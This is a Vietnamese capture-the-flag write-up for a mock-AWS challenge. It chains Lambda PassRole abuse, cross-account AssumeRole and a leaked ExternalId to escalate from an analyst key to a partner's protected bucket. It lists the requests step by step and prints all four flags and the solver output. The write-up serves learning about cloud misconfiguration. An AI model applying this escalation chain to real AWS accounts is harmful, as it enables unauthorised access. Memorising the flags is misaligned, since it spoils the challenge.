# Deputy — Cloud (Hard)

4 cờ (theo thứ tự objective):

```
recon       H7CTF{d6cc592f5a2f3db80718}
passrole    H7CTF{28f87391f8a228110839}
admin       H7CTF{ea3e1dba8012d76e2648}
externalid  H7CTF{1dbe909840d15aabdd63}
```

**Instance:** `https://web-d8f0b09a99a6a969.web.h7tex.com` · key cho trước: `AKIAANALYST0000000000` (user `analyst`, account `111111111111`)

## Đề bài

Một partner tên DeputyCorp tích hợp vào công ty ta. Ta được phát một key analyst quyền thấp. Phải chứng minh "integration đã đãng trí" đi được xa tới đâu: bốn cờ, mỗi stage sâu hơn một bậc.

## Phân tích ban đầu

Instance là mock AWS chạy `Werkzeug/3.1.8`. Ba điều xác định được chỉ bằng vài request:

| mặt API | cách gọi |
| --- | --- |
| STS + IAM | `POST /` với form `Action=...&Version=...` (dispatcher theo `Action`) |
| S3 | `GET /<bucket>` và `GET /<bucket>/<key>` (path-style; segment đầu tiên bị hiểu là tên bucket, thể hiện qua `NoSuchBucket: <segment>`) |
| Lambda | REST API thật: `GET|POST /2015-03-31/functions`, `POST /2015-03-31/functions/<name>/invocations` |

Và điều quan trọng nhất: mock không kiểm chữ ký. `Authorization: AWS4-HMAC-SHA256 Credential=AKIA.../us-east-1/iam/aws4_request, Signature=x` là đủ, nó chỉ lấy access key id từ header và session token từ `X-Amz-Security-Token`, rồi áp inline policy của identity đó. Host không có `boto3` cũng không sao: client tự viết 40 dòng (`analysis/awsclient.py`).

Việc đọc policy là chìa khoá của cả bài. `ListPolicies`/`GetPolicyVersion` trả rỗng vì mock chỉ chứa inline policy:

```
iam:ListUserPolicies(analyst)     -> ["analyst-permissions"]
iam:GetUserPolicy                 -> decodable policy document
iam:ListRolePolicies(ci-runner)   -> ["ci-runner-permissions"]
```

Hai document đó nói hết lộ trình (bản đầy đủ trong `de.md`): analyst có `iam:PassRole` riêng cho `ci-runner-role` cộng `lambda:CreateFunction|InvokeFunction`; `ci-runner-role` có `sts:AssumeRole` sang `arn:aws:iam::999999999999:role/partner-admin-role`; trust policy của runner chỉ cho `lambda.amazonaws.com` assume nó.

## Chuỗi khai thác

### Stage 1  -  recon

`s3:ListAllMyBuckets` (`GET /`) liệt kê 4 bucket: `deputy-analyst-scratch`, `deputy-runner-logs`, `deputy-flag-vault`, `deputy-crown-vault`. Analyst chỉ đọc được bucket đầu:

```
GET /deputy-analyst-scratch        -> <Key>welcome.txt</Key>
GET /deputy-analyst-scratch/welcome.txt
  Welcome, analyst.
  H7CTF{d6cc592f5a2f3db80718}
  Onboarding: our deploys run through a Lambda that executes as ci-runner-role.
```

### Stage 2  -  PassRole vào Lambda (classic "pass a role you cannot wear")

Analyst không `sts:AssumeRole` được runner (trust policy chỉ nhận service Lambda), nhưng có `iam:PassRole` cho đúng ARN đó. Tạo function mang role rồi invoke:

```
POST /2015-03-31/functions
  {"FunctionName":"deputy-relay","Role":"arn:aws:iam::111111111111:role/ci-runner-role",
   "Runtime":"python3.11","Handler":"lambda_function.lambda_handler","Code":{"ZipFile":"..."}}
-> 201
POST /2015-03-31/functions/deputy-relay/invocations
-> 200 {"message":"function executed; the execution role's environment credentials follow",
        "AWS_ACCESS_KEY_ID":"ASIA...","AWS_SECRET_ACCESS_KEY":"...","AWS_SESSION_TOKEN":"..."}
```

`GetCallerIdentity` bằng bộ creds đó trả `arn:aws:sts::111111111111:assumed-role/ci-runner-role/awslambda-deputy-relay`. Với identity này:

```
GET /deputy-runner-logs/build.log -> H7CTF{28f87391f8a228110839}
```

### Stage 3  -  AssumeRole sang account partner

Policy runner cho phép, và `partner-admin-role` không đòi điều kiện gì thêm:

```
Action=AssumeRole RoleArn=arn:aws:iam::999999999999:role/partner-admin-role
  RoleSessionName=deputy-step        (>= 2 ký tự, nếu ngắn hơn mock trả ValidationError)
-> ASIA... / tok/...  (account 999999999999)
```

Creds admin mở được `deputy-flag-vault` (analyst và runner đều không):

```
GET /deputy-flag-vault        -> keys: flag, partner-config.json
s3://deputy-flag-vault/flag                 -> H7CTF{ea3e1dba8012d76e2648}
s3://deputy-flag-vault/partner-config.json  -> {"secure_role":"arn:aws:iam::999999999999:role/partner-secure-role",
                                                "external_id":"Dc-2026-8f31a97c4b2e"}
```

### Stage 4  -  confused-deputy control

`deputy-crown-vault` vẫn 403 với partner-admin. Role `partner-secure-role` là role "hardened": trust policy đòi `sts:ExternalId`. Mock phân biệt rõ từng lỗi:

```
AssumeRole partner-secure-role                          -> 403 The trust policy requires an sts:ExternalId but none was provided.
AssumeRole ... ExternalId=wrong                         -> 403 The trust policy requires a matching sts:ExternalId.
AssumeRole ... ExternalId=Dc-2026-8f31a97c4b2e          -> 200 assumed-role/partner-secure-role/crown-step
```

Với creds cuối: `GET /deputy-crown-vault/flag` -> `H7CTF{1dbe909840d15aabdd63}`.

### Tổng kết chuỗi

```
user/analyst
  ├─ s3:GetObject(scratch)                -> cờ 1 (recon)
  ├─ iam:PassRole(ci-runner) + lambda:CreateFunction/Invoke
  │     -> chạy như ci-runner-role        -> cờ 2 (passrole)
  │        -> sts:AssumeRole(partner-admin-role, acct 999999999999)
  │                                        -> cờ 3 (admin)
  │           -> s3:GetObject(flag-vault) đọc được external_id
  │              -> sts:AssumeRole(partner-secure-role, ExternalId=...)
  │                                        -> cờ 4 (externalid)
```

## Result
```
$ python solve_deputy.py
[+] STAGE 1 recon: H7CTF{d6cc592f5a2f3db80718}
[+] STAGE 2 passrole: H7CTF{28f87391f8a228110839}
[+] STAGE 3 admin: H7CTF{ea3e1dba8012d76e2648}
[+] STAGE 4 externalid: H7CTF{1dbe909840d15aabdd63}
```

Chạy lại: `python solve_deputy.py` (cần `analysis/awsclient.py` đi kèm; ghi `flags.txt`). Lần chạy thứ hai trên cùng instance sẽ thấy `409` ở bước CreateFunction vì function đã tồn tại, invoke vẫn dùng lại nó nên chuỗi không gãy.
